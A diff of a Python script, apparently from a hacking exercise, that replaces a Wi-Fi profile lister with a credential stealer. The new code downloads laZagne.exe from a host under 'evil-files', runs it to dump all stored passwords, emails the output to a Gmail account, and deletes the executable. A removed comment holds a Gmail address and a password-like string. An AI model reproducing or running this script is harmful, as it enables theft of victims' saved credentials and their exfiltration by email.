@@ -2,7 +2,16 @@
 
 import subprocess
 import smtplib
-import re
+import tempfile
+import requests
+import os
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
 
 
 def send_mail(email, password, message):
@@ -12,12 +21,10 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
+temp_derectory = tempfile.gettempdir()
+os.chdir(temp_derectory)
 
-command = "netsh wlan show profile"
-network = subprocess.check_output(command, shell=True)
-network_names = re.findall("(?:Profile\s*:\s)(.*)", network.decode())
-
-
-for network_name in network_names:
-    print(network_name)
-# send_mail(b"detmong18@gmail.com", b"quynh.huynh", network_names)
+download("http://10.0.2.10/evil-files/laZagne.exe")
+result = subprocess.check_output("laZagne.exe all", shell=True)
+send_mail(b"...@gmail.com", b"pass", result)
+os.remove("laZagne.exe")
